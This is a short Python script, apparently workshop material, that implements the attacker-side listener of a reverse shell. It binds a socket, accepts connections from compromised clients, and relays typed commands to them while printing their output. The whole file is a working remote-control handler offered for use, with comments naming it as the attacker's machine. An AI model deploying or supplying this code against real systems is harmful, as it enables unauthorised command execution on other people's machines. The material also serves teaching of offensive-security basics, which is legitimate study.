####################################
# the attackers machine will run 
# this script in any form possible
# this is a slightly different 
# version form the workshop
####################################

# the import statements
import socket

# static variables change the port and the ip accordingly
LHOST=('127.0.0.1',8080)


# the main funciton
def main():
	
	#making the client socket 
	ServerSocket= socket.socket()
	# this will me the socket working if the socket is being used elsewhere
	ServerSocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	ServerSocket.bind(LHOST)
	#this command start to listen for incomming connections
	ServerSocket.listen(5)

	while True:
		#accept connection for infinite number of times
		Client, Address = ServerSocket.accept()
		username=str(Client.recv(1024).decode('ascii'))
		while True:
			#get user input
			data= input(username+">")

			#send the data
			Client.send(data.encode('ascii'))
			if 'exit' in data:
				break
			
			output=str(Client.recv(2048))
			print(output)
	ServerSocket.close()

main()



